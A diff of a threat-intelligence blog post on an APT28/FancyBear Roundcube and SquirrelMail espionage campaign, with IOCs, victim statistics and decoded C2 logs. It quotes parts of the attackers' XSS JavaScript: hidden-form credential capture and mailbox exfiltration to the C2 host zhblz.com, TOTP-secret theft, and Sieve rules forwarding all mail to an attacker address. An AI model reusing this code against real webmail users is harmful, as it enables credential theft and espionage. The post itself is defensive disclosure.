@@ -7,20 +7,28 @@ ribbon: black
 description: "FancyBear's OPSEC failure gives Ctrl-Alt-Intel rare visibility inside Russian espionage operations"
 categories:
   - Threat Research
+content_type: research
 tags:
-  - Threat Research
+  - Russia
+  - Ukraine
+  - APT
+  - C2
+  - Espionage
+  - Phishing
+  - ClickFix
+  - Credential Theft
+  - Exploitation
 toc: true
 redirect_from:
   - /threat%20research/FancyBear/
   - /threat research/FancyBear/
 ---
 
+## Overview
 
-# Overview
+On March 11th 2026, our friends at Hunt.io published an analysis into a campaign they track as [Operation Roundish](https://hunt.io/blog/operation-roundish-apt28-roundcube-exploitation), based on an exposed open-directory scanned on 13th January 2026. This archive is available on the Hunt.io platform.
 
-On March 11th 2026, our friends at Hunt.io published an analysis into a campaign they track as [Operation Roundish](https://hunt.io/blog/operation-roundish-apt28-roundcube-exploitation), based on an exposed open-directory scanned on 13th January 2026. This archive is available on the Hunt.io platform. 
-
-This was campaign was attributed by Hunt.io to a Russian Advanced Persistent Threat (APT), tracked as [FancyBear](https://www.crowdstrike.com/en-us/blog/who-is-fancy-bear/) by CrowdStrike,  [APT28](https://cloud.google.com/blog/topics/threat-intelligence/apt28-a-window-into-russias-cyber-espionage-operations) by Mandiant, [Forest Blizzard/STRONTIUM](https://www.microsoft.com/en-us/security/security-insider/threat-landscape/forest-blizzard) by Microsoft, and [Sednit](https://web-assets.esetstatic.com/wls/2016/10/eset-sednit-part-2.pdf) by ESET. 
+This was campaign was attributed by Hunt.io to a Russian Advanced Persistent Threat (APT), tracked as [FancyBear](https://www.crowdstrike.com/en-us/blog/who-is-fancy-bear/) by CrowdStrike,  [APT28](https://cloud.google.com/blog/topics/threat-intelligence/apt28-a-window-into-russias-cyber-espionage-operations) by Mandiant, [Forest Blizzard/STRONTIUM](https://www.microsoft.com/en-us/security/security-insider/threat-landscape/forest-blizzard) by Microsoft, and [Sednit](https://web-assets.esetstatic.com/wls/2016/10/eset-sednit-part-2.pdf) by ESET.
 
 The UK NCSC, part of GCHQ, has previously [assessed](https://www.ncsc.gov.uk/files/Advisory_APT28-exploits-known-vulnerability.pdf) "APT28 is almost certainly the Russian General Staff Main Intelligence Directorate (GRU) 85th special Service Centre (GTsSS) Military Intelligence Unit 26165".
 
@@ -37,7 +45,7 @@ Ctrl-Alt-Intel linked this infrastructure back to [CERT-UA reporting from Septem
 
 > Interested in this campaign? Worried your organisation has been impacted by FancyBear? We're happy to share further detailed information to relevant authorities. Please email `contact[@]ctrlaltintel[.]com`.
 
-## Unique Victim Emails
+### Unique Victim Emails
 
 | Country | Unique victims | Key organisations |
 |---|---|---|
@@ -48,11 +56,11 @@ Ctrl-Alt-Intel linked this infrastructure back to [CERT-UA reporting from Septem
 | Bulgaria | 4 | Government (4) |
 | North Macedonia | 1 | Government (1) |
 
-## Geopolitical significance 
+### Geopolitical significance
 
 A hypothesis is that this victimology reflects **regional military relevance**, rather than a random spread of webmail targets of European government/military.
 
-* Romania, Bulgaria, and Greece appear in a [documented regional security context](https://www.reuters.com/world/europe/romania-bulgaria-greece-sign-deal-boost-military-mobility-2024-07-11). On 11 July 2024, the three countries (who were all victims) signed a deal to speed the cross-border movement of troops and weapons to NATO’s eastern flank. 
+* Romania, Bulgaria, and Greece appear in a [documented regional security context](https://www.reuters.com/world/europe/romania-bulgaria-greece-sign-deal-boost-military-mobility-2024-07-11). On 11 July 2024, the three countries (who were all victims) signed a deal to speed the cross-border movement of troops and weapons to NATO’s eastern flank.
 
 * Greece also had a direct Ukraine-related role. On 21 August 2023, President Zelensky said [Greece would participate in training Ukrainian pilots for F-16s](https://www.reuters.com/world/europe/greece-train-ukrainian-f-16-pilots-zelenskiy-says-2023-08-21), and Reuters reported that officials from the F-16 coalition said training would take place in Denmark and Romania.
 
@@ -60,13 +68,13 @@ A hypothesis is that this victimology reflects **regional military relevance**, 
 
 * North Macedonia was reported on 28 February 2024 to have [joined Western sanctions against Russia](https://www.reuters.com/world/europe/ukraines-zelenskiy-arrives-albania-foreign-minister-says-2024-02-28) and sent arms and equipment to Ukraine. That makes North Macedonia a plausible, if lower-significance, fit within a victim set linked to states supporting Ukraine
 
-The timing of the compromises of these secific Government and Militiary targets, with the first reported in September 2024 by CERT-UA, continuing onto late 2025 and potentially early 2026, is not coincidental.  
+The timing of the compromises of these secific Government and Militiary targets, with the first reported in September 2024 by CERT-UA, continuing onto late 2025 and potentially early 2026, is not coincidental.
 
-# OPSEC & Opendirs
+## OPSEC & Opendirs
 
-When cybercriminals, including nation-state groups, stage payloads or share files, they *may* do so with an "open-directory", also known as a "opendir". This allows them to quickly and easily download files via HTTP - just by running a command like `python -m http.server 8889`.  
+When cybercriminals, including nation-state groups, stage payloads or share files, they *may* do so with an "open-directory", also known as a "opendir". This allows them to quickly and easily download files via HTTP - just by running a command like `python -m http.server 8889`.
 
-Due to the operational-tempo of performing cyber-attacks, threat actors often get distracted and forget to close these - which can in some cases expose data to the public that should've private - at least in the eyes of the threat actors. 
+Due to the operational-tempo of performing cyber-attacks, threat actors often get distracted and forget to close these - which can in some cases expose data to the public that should've private - at least in the eyes of the threat actors.
 
 These operational security (OPSEC) failures give rare visibility into attacks from the perspective of the **threat actor owned server**. They may allow researchers to identify:
 
@@ -79,21 +87,21 @@ These operational security (OPSEC) failures give rare visibility into attacks fr
 
 > Notably, open-directories update in real time as threat actors add or remove files to the directory which is being exposed. If they are left open, it is possible to track and compare changes to files within open-directories in order to observe the evolution of the campaign in real time.
 
-# Timeframe
+## Timeframe
 
-Ctrl-Alt-Intel assesses FancyBear operated from a NameCheap Virtual Private Server (VPS), located within the US, on the IP address `203.161.50[.]145` from at least September 2024. 
+Ctrl-Alt-Intel assesses FancyBear operated from a NameCheap Virtual Private Server (VPS), located within the US, on the IP address `203.161.50[.]145` from at least September 2024.
 
-Using [Censys' Service History](https://platform.censys.io/hosts/203.161.50.145/history) feature, their telemetry suggests that one of the open-directories (exposed from port `8889`) was open between the dates of **31st January 2026 12:14 UTC** and **11th March 2026 10:02 UTC**. 
+Using [Censys' Service History](https://platform.censys.io/hosts/203.161.50.145/history) feature, their telemetry suggests that one of the open-directories (exposed from port `8889`) was open between the dates of **31st January 2026 12:14 UTC** and **11th March 2026 10:02 UTC**.
 
 [![1](/assets/images/fancy/1.png){: .align-center .img-border}](/assets/images/muddy/1.png)
-<p class="figure-caption">Censys Service History for `203.161.50[.]145`</p>  
+<p class="figure-caption">Censys Service History for `203.161.50[.]145`</p>
 
-There are a few important things to note: 
+There are a few important things to note:
 
 * These dates are when Censys scanned & identified open ports, but it is **very likely** was open before & after these times
 * This threat actor had multiple open-directories from January - March 2026, although each was on the port `8889`
 
-The open-directory scanned and archived by Hunt.io on **13th January 2026 10:41 UTC** was located within a **different directory** than the one discussed by Ctrl-Alt-Intel in this blog. As a result, we had additional visibility into FancyBear's operations. 
+The open-directory scanned and archived by Hunt.io on **13th January 2026 10:41 UTC** was located within a **different directory** than the one discussed by Ctrl-Alt-Intel in this blog. As a result, we had additional visibility into FancyBear's operations.
 
 [![1](/assets/images/fancy/2.png){: .align-center .img-border}](/assets/images/muddy/2.png)
 <p class="figure-caption">Hunt.io archive from 13th January</p>
@@ -101,22 +109,22 @@ The open-directory scanned and archived by Hunt.io on **13th January 2026 10:41 
 Notably, from the open-directory we analysed there were no `.profile` or `.bash_history` files - indicating this was located within a different directory to the one discussed within Hunt.io's analysis. However, we saw this was clearly the same campaign and threat actor.
 
 [![1](/assets/images/fancy/4.png){: .align-center .img-border}](/assets/images/muddy/4.png)
-<p class="figure-caption">Open-directory from 11th March</p>  
+<p class="figure-caption">Open-directory from 11th March</p>
 
-## Active since September 2024
+### Active since September 2024
 
-We were **extremely shocked** to see the same C2 server IP address `203.161.50[.]145`, attributed with medium-confidence to *FancyBear* by the [Ukranian CERT](https://cert.gov.ua/article/6281123) on **25th October 2024**. Thankfully, although it took nearly two years, *FancyBear* made the mistake of exposing their operation from this same server. 
+We were **extremely shocked** to see the same C2 server IP address `203.161.50[.]145`, attributed with medium-confidence to *FancyBear* by the [Ukranian CERT](https://cert.gov.ua/article/6281123) on **25th October 2024**. Thankfully, although it took nearly two years, *FancyBear* made the mistake of exposing their operation from this same server.
 
 Defenders and Intelligence analysts are often reminded of the volatility of IP addresses with the **Pyramid of Pain**. This conceptual framework categorizes indicators based on the difficulty ("pain") they cause attackers to alter. Ranging from trivial to change (bottom: Hash Values, IP Addresses) to highly difficult (top: TTPs), it helps security teams focus on high-impact detections:
 
 [![1](/assets/images/fancy/3.jpg){: .align-center .img-border}](/assets/images/muddy/3.jpg)
-<p class="figure-caption">Pyramid of Pain - ref. AttackIQ</p>  
+<p class="figure-caption">Pyramid of Pain - ref. AttackIQ</p>
 
-In this case, such frameworks didn't apply in practice, *FancyBear* continued to operate from the same server that was publicly attributed to *FancyBear* over **500 days ago**.  
+In this case, such frameworks didn't apply in practice, *FancyBear* continued to operate from the same server that was publicly attributed to *FancyBear* over **500 days ago**.
 
-## CERT-UA Advisories
+### CERT-UA Advisories
 
-The IP address associated with the 2026 OPSEC open-directory blunder, `203.161.50[.]145`, linked to FancyBear/APT28, was previously observed by CERT-UA on two separate occasions. 
+The IP address associated with the 2026 OPSEC open-directory blunder, `203.161.50[.]145`, linked to FancyBear/APT28, was previously observed by CERT-UA on two separate occasions.
 
 * CERT-UA#10859 - *FancyBear* exploiting Roundcube (CVE-2023-43770)
 * [CERT-UA#11689](https://cert.gov.ua/article/6281123) - *FancyBear* using ClickFix
@@ -124,17 +132,17 @@ The IP address associated with the 2026 OPSEC open-directory blunder, `203.161.5
 On the 25th October 2024, [CERT-UA#11689](https://cert.gov.ua/article/6281123) was published exposing a spear-phishing campaign targeting local governments with the subject "Spreadsheet Replacement". The phishing emails contained a link to the domain `docs.google.com.spreadsheets.d.1ip6eeakdebmwteh36vana4hu-glaeksstsht-boujdk.zhblz[.]com` where John Hammond's [reCAPTCHA Phish POC](https://github.com/JohnHammond/recaptcha-phish) was used to deliver Metasploit payloads with the C2 IP address `203.161.50[.]145`:
 
 [![1](/assets/images/fancy/5.png){: .align-center .img-border}](/assets/images/muddy/5.png)
-<p class="figure-caption">ClickFix Execution Chain - ref. CERT-UA</p>  
+<p class="figure-caption">ClickFix Execution Chain - ref. CERT-UA</p>
 
-Within this same blog, CERT-UA mentioned that in a **September 2024** incident, CERT-UA#10859, the same IP address was associated with exploitation of Roundcube (CVE-2023-43770). Roundcube exploitation from this IP address was corroborated by Hunt.io & Ctrl-Alt-Intel's 2026 analysis. 
+Within this same blog, CERT-UA mentioned that in a **September 2024** incident, CERT-UA#10859, the same IP address was associated with exploitation of Roundcube (CVE-2023-43770). Roundcube exploitation from this IP address was corroborated by Hunt.io & Ctrl-Alt-Intel's 2026 analysis.
 
 > FancyBear had used same techniques to target Roundcube from this server since September 2024 to March 2026, when we believe their access has been removed
 
-# Ctrl-Alt-Intel Analysis
+## Ctrl-Alt-Intel Analysis
 
 We mentioned earlier that the open-directory identified by Ctrl-Alt-Intel was found within a separate directory to the one discussed and archived by Hunt.io. Although we did see consistent targeting, identical payloads and clearly the same campaign - we also observed many more related payloads, scripts and telemetry:
 
-## "New" open-dir files
+### "New" open-dir files
 
 We want to note some of these files were mentioned within Hunt.io's analysis, however they **weren't included within the January 13th archive** - but rather referenced often as "output" files from the scripts they analysed.
 
@@ -174,22 +182,22 @@ We want to note some of these files were mentioned within Hunt.io's analysis, ho
 | `taker/creds.csv` | Phishing page captured credentials | 2026-03-07 |
 | `taker/visit.csv` | Phishing page visitor log (IPs + User-Agents + timestamps) | 2026-03-11 |
 
-The new files (`scriptTaker.js` / `old_worker.js`) and the Hunt.io reported scripts (`worker.js` / `newworker.js` / `workerlast.js`) are all the core XSS payloads targeting Roundcube. Upon execution, these would download additional modules from the domain `zhblz[.]com`. 
+The new files (`scriptTaker.js` / `old_worker.js`) and the Hunt.io reported scripts (`worker.js` / `newworker.js` / `workerlast.js`) are all the core XSS payloads targeting Roundcube. Upon execution, these would download additional modules from the domain `zhblz[.]com`.
 
-We observed an additional similar XSS payload, `worker2.js`, that was a previously undisclosed SquirrelMail variant - which we will discuss after the Roundcube section.   
+We observed an additional similar XSS payload, `worker2.js`, that was a previously undisclosed SquirrelMail variant - which we will discuss after the Roundcube section.
 
-> The complete FancyBear toolkit is currently uploaded to our [Github](https://github.com/ctrlaltint3l/intelligence/tree/main/FancyBear/roundish). Victim data or C2 telemetry is not available to the public. If you are an impacted organisation, or a relevant authority, please reach out to `contact[@]ctrlaltintel[.]com` for this information. 
+> The complete FancyBear toolkit is currently uploaded to our [Github](https://github.com/ctrlaltint3l/intelligence/tree/main/FancyBear/roundish). Victim data or C2 telemetry is not available to the public. If you are an impacted organisation, or a relevant authority, please reach out to `contact[@]ctrlaltintel[.]com` for this information.
 
-# Roundcube Recap
+## Roundcube Recap
 
-The initial `worker.js` script, executed via XSS, will perform certain actions in-line from this core script - like extracting the victim email address and exfiltrating emails within their mailbox. 
+The initial `worker.js` script, executed via XSS, will perform certain actions in-line from this core script - like extracting the victim email address and exfiltrating emails within their mailbox.
 
-However, it also leverages additional "modules" that perform specific functions - like adding Sieve mailbox rules, extracting TOTP tokens or stealing the address book. 
+However, it also leverages additional "modules" that perform specific functions - like adding Sieve mailbox rules, extracting TOTP tokens or stealing the address book.
 
 [![1](/assets/images/fancy/7.png){: .align-center .img-border}](/assets/images/muddy/7.png)
-<p class="figure-caption">Roundcube Compromise Chain</p>  
+<p class="figure-caption">Roundcube Compromise Chain</p>
 
-## In-line execution
+### In-line execution
 
 **Victim Identification**
 
@@ -206,7 +214,7 @@ This is logged to the C2 in the format `u_{email}_o_m`.
 
 **Credential Theft**
 
-The Roundcube `worker.js` will attempt credential theft both in-line and via an external module. 
+The Roundcube `worker.js` will attempt credential theft both in-line and via an external module.
 
 The in-line techniques works by creating a hidden `<div>` with two `<input>` elements that attempt to auto-fill credentials. This is hidden and embedded to the HTML of the Roundcube page.
 
@@ -216,14 +224,14 @@ A global click handler is then attached to the entire document body, meaning aft
 async function getChromeCredentialsAndSend(mail_address) {
   userCredentials = document.getElementById("username").value + `:` + document.getElementById("password").value;
   base64Credentials = btoa(userCredentials);
-  fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`c_c_f_u_${mail_address}_:_${base64Credentials}`}`); 
+  fetch(`${"https://zhblz.com/zJ2w9x"}?log=${`c_c_f_u_${mail_address}_:_${base64Credentials}`}`);
 };                                                   // Log to C2 with prefix: c_c_f_u_
 
-// REDACTED 
+// REDACTED
 
 (function() {
-  var f = document.createElement("div");             // Create auto-fill form 
-  f.innerHTML = `<input type='text' name='username' id='username' value='' autocomplete='on'>     
+  var f = document.createElement("div");             // Create auto-fill form
+  f.innerHTML = `<input type='text' name='username' id='username' value='' autocomplete='on'>
                  <input type='password' name='password' id='password' value='' autocomplete='on'>`;
   f.style.visibility = "hidden";
   document.body.appendChild(f);
@@ -246,7 +254,7 @@ Emails are extracted via using the Roundcube URIs to list emails, then iterative
 3. Loop through email UIDs
 4. HTTP request to `?_task=mail&_save=0&_uid={UID}&_mbox=${Inbox}&_action=viewsource&_extwin=1` to download
 5. Exfiltrate via POST request to `hXXps://zhblz[.]com/zJ2w9x/uploadfile/`
-  
+
 ```js
 r = new RegExp(/add_message_row\((\d*)/g); // Regex to extract email IDs from the mailbox lisiting JSON output
 
@@ -269,7 +277,7 @@ async function downd(box) {
         s.append("inbox", g, f + ".eml");
         s.append("d", d);
         let formData = new FormData;
-        formData.append("file", g);        
+        formData.append("file", g);
         fetch(ssv, {method: "POST", mode: "no-cors", body: formData, contentType: "text/html;charset=UTF-8"}); // POST to Exfiltrate emails
       }
       ;
@@ -287,7 +295,7 @@ async function downd(box) {
 })();
 ```
 
-## Modular components
+### Modular components
 
 **TOTP/2FA token theft**
 
@@ -304,23 +312,23 @@ async function keyTwoAuth(callback) {
   try {
       var fullUrl = window.location.origin + window.location.pathname;
       const respGet = await fetch(`${fullUrl}?_task=settings&_action=plugin.twofactor_gauthenticator`);
-      // REDACTED - error check 
+      // REDACTED - error check
       const htmlTextAuth = await respGet.text();
       const parser = new DOMParser();
       const doc = parser.parseFromString(htmlTextAuth, 'text/html');
       const passwordElements = doc.querySelectorAll('[type="password"]');    // Extracts 5 fields: TOTP secret + 4 recovery codes
       callback(`${passwordElements[0].value}-${passwordElements[1].value}-${passwordElements[2].value}-${passwordElements[3].value}-${passwordElements[4].value}`)
   } catch (error) {
-    callback('no_key');    
+    callback('no_key');
   }
 }
 ```
 
-The Roundcube [twofactor_gauthenticator](https://github.com/alexandregz/twofactor_gauthenticator) plugin displays the TOTP secret and recovery codes in hidden `password` fields within the settings page. Because the XSS payload runs **within the victim's authenticated session**, it can request this settings page with the victim's cookies and read the values directly from the DOM. 
+The Roundcube [twofactor_gauthenticator](https://github.com/alexandregz/twofactor_gauthenticator) plugin displays the TOTP secret and recovery codes in hidden `password` fields within the settings page. Because the XSS payload runs **within the victim's authenticated session**, it can request this settings page with the victim's cookies and read the values directly from the DOM.
 
 The TOTP secret is a base32-encoded key (e.g., `JBSWY3DPEHPK3PXP`) that generates time-based codes. With this secret, FancyBear can generate valid 2FA codes indefinitely - effectively **bypassing 2FA entirely** without needing physical access to the victim's authenticator app.
 
-From the C2 log, we observed **516 entries** with the `k_t_f_u_` prefix across **108 unique victim email addresses**. Decoding the base64 blobs, **256 contained real TOTP secrets** and **260 returned `no_key`** - meaning those victims hadn't configured 2FA.  
+From the C2 log, we observed **516 entries** with the `k_t_f_u_` prefix across **108 unique victim email addresses**. Decoding the base64 blobs, **256 contained real TOTP secrets** and **260 returned `no_key`** - meaning those victims hadn't configured 2FA.
 
 > For victims who *had* configured 2FA, FancyBear obtained **both their password and their TOTP secret** in a single XSS execution - providing complete, persistent access to the mailbox with no further interaction required from the victim.
 
@@ -345,13 +353,13 @@ After deobfuscation, `adbook.js` revealed a three-stage pagination approach:
 3. Iterate through **all pages** per source, extract email addresses via regex `/[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}/g`
 4. Join all extracted emails with commas, base64-encode, and exfiltrate via C2 with prefix `t_e_f_u_`
 
-From the C2 log, we observed **2,870 entries** with the `t_e_f_u_` prefix across **157 unique victim email addresses**. Decoding all the base64 blobs, we recovered **11,527 unique email addresses** across **2,254 distinct domains**. 
+From the C2 log, we observed **2,870 entries** with the `t_e_f_u_` prefix across **157 unique victim email addresses**. Decoding all the base64 blobs, we recovered **11,527 unique email addresses** across **2,254 distinct domains**.
 
 The intelligence value of this data is enormous. It maps every contact that compromised government and military officials had ever emailed, exposing communication & contact networks.
 
 **Sieve Forwarding Rule Creation**
 
-This was the most impactful module in the toolkit. The `addRedirectMailBox.js` module (**obfuscated**) creates a Sieve mail filtering rule that silently forwards **every single incoming email** to a FancyBear-controlled mailbox, persisting post-inital compromise. 
+This was the most impactful module in the toolkit. The `addRedirectMailBox.js` module (**obfuscated**) creates a Sieve mail filtering rule that silently forwards **every single incoming email** to a FancyBear-controlled mailbox, persisting post-inital compromise.
 
 After deobfuscation, the module takes two parameters - the Roundcube base URL and the redirect target email - and performs a two-step process:
 
@@ -381,14 +389,14 @@ _enabled     = 1                              ← Rule is active immediately
 _join        = any                            ← Match "any" condition
 
 _header[0]        = (empty)                   ← No header filter
-_rule_op[0]       = contains                  ← No matching criteria  
+_rule_op[0]       = contains                  ← No matching criteria
 _rule_target[0][] = (empty)                   ← No target value
 
 _action_type[0]   = redirect_copy             ← Forward a COPY of the email (original stays in inbox)
 _action_target[0] = advenwolf@proton.me       ← FancyBear's collection address
 ```
 
-# SquirrelMail
+## SquirrelMail
 
 In ESET's May 2025 "Operation RoundPress", they observed *FancyBear* leverage 4 distinct JS payloads:
 
@@ -397,27 +405,27 @@ In ESET's May 2025 "Operation RoundPress", they observed *FancyBear* leverage 4 
 * SpyPress.ROUNDCUBE
 * SpyPress.ZIMBRA
 
-Each of these were injected into victim webmails (Roundcube, MDaemon, Horde, Zimbra) via XSS vulnerabilities. 
+Each of these were injected into victim webmails (Roundcube, MDaemon, Horde, Zimbra) via XSS vulnerabilities.
 
 Ctrl-Alt-Intel identified an additional JavaScript payload that targeted SqurrelMail, a mailserver that hasn't previously been linked to this campaign by Hunt.io, ESET or CERT-UA:
 
 [![1](/assets/images/fancy/6.png){: .align-center .img-border}](/assets/images/muddy/6.png)
-<p class="figure-caption">SquirrelMail Compromise Chain</p>  
+<p class="figure-caption">SquirrelMail Compromise Chain</p>
 
-## In-line execution
+### In-line execution
 
 **Victim Identification**
 
 Unlike with Roundcube, which simply extracted the victim email address using `rcmail.env.username`, more effort was required to identify the victim with SquirrelMail:
 
 [![1](/assets/images/fancy/8.png){: .align-center .img-border}](/assets/images/muddy/8.png)
-<p class="figure-caption">SquirrelMail Victim Identification Source Snippet</p>  
+<p class="figure-caption">SquirrelMail Victim Identification Source Snippet</p>
 
 1. Re-fetches the current page URL with `fetch(originalUrl)`
 2. Parses the full HTML response into a DOM via `DOMParser`
 3. Extracts `body.innerText`
 4. Regex against the `To:` header line to pull out an email address, validate
-5. Logs with prefix `e_h_f_u_` & `h_f_u_` 
+5. Logs with prefix `e_h_f_u_` & `h_f_u_`
 
 * `h_f_u_{email}` = success (username extracted from HTML)
 * `e_h_f_u_{email}` = error (extraction failed)
@@ -460,10 +468,10 @@ The approach differs significantly from Roundcube:
 4. Extracts `.textContent` (the contact name/email) from each link
 5. Joins contacts with dashes, base64-encodes, and exfiltrates via C2
 
-From the C2 log, we observed **98 entries** with the `t_a_b_f_u_` prefix. However, all 4 SquirrelMail victims were **attacker test accounts** (`pru.mik@gov.vppdr.com`, `pru.od@gov.vppdr.com`, `pru.ok@gov.vppdr.com`, `shark@mail.govmk.com`). 
+From the C2 log, we observed **98 entries** with the `t_a_b_f_u_` prefix. However, all 4 SquirrelMail victims were **attacker test accounts** (`pru.mik@gov.vppdr.com`, `pru.od@gov.vppdr.com`, `pru.ok@gov.vppdr.com`, `shark@mail.govmk.com`).
 
 
-# Inside FancyBear's Command & Control server
+## Inside FancyBear's Command & Control server
 
 Within the open-directory Ctrl-Alt-Intel analysed, we discovered FancyBear exposed the server-side C2 components that revealed additional functionality. After digging through these, and the corresponding logs, we had an almost complete picture of how FancyBear operated and targeted its victims.
 
@@ -473,18 +481,18 @@ The Command & Control (C2), hosted on `zhblz[.]com (203.161.50[.]145)` performed
 * Host additional JS modules
 * Host ClickFix lures
 * Host malware
-* Host SSH keys 
+* Host SSH keys
 * Log C2 telemetry
 * Allow exfiltration of `.eml` files
 * Allow exfiltration and decryption of Browser credentials
-* Host credential theft page 
+* Host credential theft page
 
-## FancyBear ClickFixing Throwback
+### FancyBear ClickFixing Throwback
 
 We mentioned earlier that from [CERT-UA#11689](https://cert.gov.ua/article/6281123), FancyBear leveraged John Hammond's [reCAPTCHA Phish POC](https://github.com/JohnHammond/recaptcha-phish) in order to gain initial access:
 
 [![1](/assets/images/fancy/11.png){: .align-center .img-border}](/assets/images/muddy/11.png)
-<p class="figure-caption">FancyBear ClickFix execution chain</p>  
+<p class="figure-caption">FancyBear ClickFix execution chain</p>
 
 Although commented out, within the main FancyBear C2 source - we saw clear evidence of the server-side components hosting the payloads seen in their reporting:
 
@@ -492,7 +500,7 @@ Although commented out, within the main FancyBear C2 source - we saw clear evide
 ###########---reCAPTCHA/Chrome---##############
 # @app.route('/document')
 # def first():
-    
+
 #     return send_from_directory('static', 'index.html')
 
 # @app.route('/B')
@@ -530,9 +538,9 @@ Although commented out, within the main FancyBear C2 source - we saw clear evide
 We saw these precise same IOCs mentioned within the Ukranian CERT's reporting:
 
 [![1](/assets/images/fancy/10.png){: .align-center .img-border}](/assets/images/muddy/10.png)
-<p class="figure-caption">ClickFix IOCs - ref. CERT-UA</p>  
+<p class="figure-caption">ClickFix IOCs - ref. CERT-UA</p>
 
-## XSS Payload Hosting
+### XSS Payload Hosting
 
 Payloads are the JS files that run in the context of a compromised webmail (Roundcube/SquirrelMail) after XSS. The **same server** that hosts the phishing pages also **serves these payloads** (and logs telemetry):
 
@@ -542,29 +550,29 @@ Payloads are the JS files that run in the context of a compromised webmail (Roun
 | `/worker2` | worker2.js | SquirrelMail XSS payload |
 | `/<path>` | any file under `.` | Catch-all static, used for JS modules `/addRedirectMailBox.js` |
 
-## Credential Theft Phishing
+### Credential Theft Phishing
 
-A capability previously unreported and unrelated to the Roundcube XSS tradecraft, was cloned Roundcube login pages used for credential harvesting. 
+A capability previously unreported and unrelated to the Roundcube XSS tradecraft, was cloned Roundcube login pages used for credential harvesting.
 
 These threat actors were persistent. They attempted both to steal credentials via JavaScript execution and separately by socially engineering users into entering credentials on cloned target webmail servers:
 
 [![1](/assets/images/fancy/12.png){: .align-center .img-border}](/assets/images/muddy/12.png)
-<p class="figure-caption">Server-side code for credential harvesting</p>  
+<p class="figure-caption">Server-side code for credential harvesting</p>
 
 At the point of our analysis, the C2 server was hosting cloned Roundcube servers specifically targeting the Romanian airforce:
 
 [![1](/assets/images/fancy/9.png){: .align-center .img-border}](/assets/images/muddy/9.png)
-<p class="figure-caption">Romanian Airforce Roundcube Lure</p>  
+<p class="figure-caption">Romanian Airforce Roundcube Lure</p>
 
-> This did not appear successful. We observed 1 valid Romanian airforce credential stolen. 
+> This did not appear successful. We observed 1 valid Romanian airforce credential stolen.
 
-# C2 log analysis
+## C2 log analysis
 
-The file `url.txt` is the backbone of FancyBear's telemetry. Every XSS payload execution - across Roundcube, SquirrelMail and the earlier `scriptTaker.js` variant logs results back to the C2 via GET requests to `hXXps://zhblz[.]com/zJ2w9x?log={prefix}_{data}`. 
+The file `url.txt` is the backbone of FancyBear's telemetry. Every XSS payload execution - across Roundcube, SquirrelMail and the earlier `scriptTaker.js` variant logs results back to the C2 via GET requests to `hXXps://zhblz[.]com/zJ2w9x?log={prefix}_{data}`.
 
 We recovered **11,067 entries** in this file. These were not timestamped unfortunately. Each entry uses a structured prefix that identifies the exact operation and its outcome. By decoding these, we could reconstruct FancyBear's campaign at scale.
 
-## C2 Log Prefix Reference
+### C2 Log Prefix Reference
 
 | Prefix | Action | Platform | Data format |
 |---|---|---|---|
@@ -580,7 +588,7 @@ We recovered **11,067 entries** in this file. These were not timestamped unfortu
 
 Using these prefixes, we decoded the entirety of FancyBear's telemetry to measure the success of their campaign across **24 unique victim organisations**:
 
-## Credential Theft
+### Credential Theft
 
 Across both the inline hidden form technique (`c_c_f_u_`) and the external module (`f_c_f_u_`), we observed **3,380 credential capture entries** across **244 unique victim email addresses**. The most targeted organisations were:
 
@@ -598,7 +606,7 @@ Across both the inline hidden form technique (`c_c_f_u_`) and the external modul
 | `afas.ro` (Romanian Air Force Academy) | 5 |
 | `pd.government.bg` (Bulgarian Government) | 4 |
 
-## Sieve Forwarding Rules
+### Sieve Forwarding Rules
 
 This was arguably the most damaging capability. Successfully created Sieve rules silently forward **every incoming email** to an attacker-controlled mailbox.
 
@@ -623,11 +631,11 @@ The **vast majority** (826 out of 853 entries) redirected to `advenwolf@proton.m
 
 A smaller set (27 entries) redirected to addresses at `gov.vppdr[.]com`, an attacker-controlled domain that typosquats the legitimate Ukrainian prosecution domain `vppdr.gp.gov.ua`. This domain is significant as it typosquats to Ukrainian government prosecutor’s office, specifically the southern-region defense specialization.
 
-The pivot from using `@proton.me` to unique typosquatted email addresses as recipients shows clear campaign evolution with focus on evasion by making the forwarding emails appear more legitimate.   
+The pivot from using `@proton.me` to unique typosquatted email addresses as recipients shows clear campaign evolution with focus on evasion by making the forwarding emails appear more legitimate.
 
 > The Romanian Air Force (`roaf.ro`) was the **single most targeted organisation** in the Sieve data, thankfully **every single attempt failed**. Their mail server did not support ManageSieve, which inadvertently protected them from FancyBear's most persistent access technique.
 
-## TOTP/2FA Extraction
+### TOTP/2FA Extraction
 
 We observed **516 entries** with the `k_t_f_u_` prefix across **108 unique victim email addresses**. Decoding the base64 payloads revealed **256 contained real TOTP secrets** (with 4 recovery codes each) and **260 returned `no_key`**, meaning 2FA was not configured for those accounts. The most impacted organisations:
 
@@ -640,7 +648,7 @@ We observed **516 entries** with the `k_t_f_u_` prefix across **108 unique victi
 | `vppdr.gp.gov.ua` (Ukrainian Defense Prosecutor) | 5 |
 | `afas.ro` (Romanian AF Academy) | 5 |
 
-## Address Book Theft
+### Address Book Theft
 
 We observed **2,870 entries** with the `t_e_f_u_` prefix across **157 unique Roundcube victim email addresses**. We recovered **11,527 unique email addresses** across **2,254 distinct domains** - the full scope of which is detailed in the *Impact & Victimology* section.
 The organisations with the most address books stolen:
@@ -654,9 +662,9 @@ The organisations with the most address books stolen:
 | `vppdr.gp.gov.ua` (Ukranian Defence Prosecutor) | 11 |
 | `chrg.gp.gov.ua` (Chernihiv Prosecutor) | 10 |
 
-### Contact Email Address Network
+#### Contact Email Address Network
 
-Looking at all **11,527 unique emails**, it is clear FancyBear managed to recover a large network of connected contacts to their Government and Military victims:   
+Looking at all **11,527 unique emails**, it is clear FancyBear managed to recover a large network of connected contacts to their Government and Military victims:
 
 | Category | Email addresses | Key domains |
 |---|---|---|
@@ -677,51 +685,51 @@ Looking at all **11,527 unique emails**, it is clear FancyBear managed to recove
 | Personal email | ~5,079 | `gmail.com` (2,586), `ukr.net` (1,979), `i.ua` (142), `yahoo.com` (79), `meta.ua` (59), `hotmail.com` (47), `icloud.com` (38) |
 | Other (Ukrainian .ua commercial, education, uncategorised) | ~1,239 | `nlu.edu.ua` (54), `ukroboronprom.com` (10), plus ~800 across 600+ miscellaneous domains |
 
-# Conclusion
+## Conclusion
 
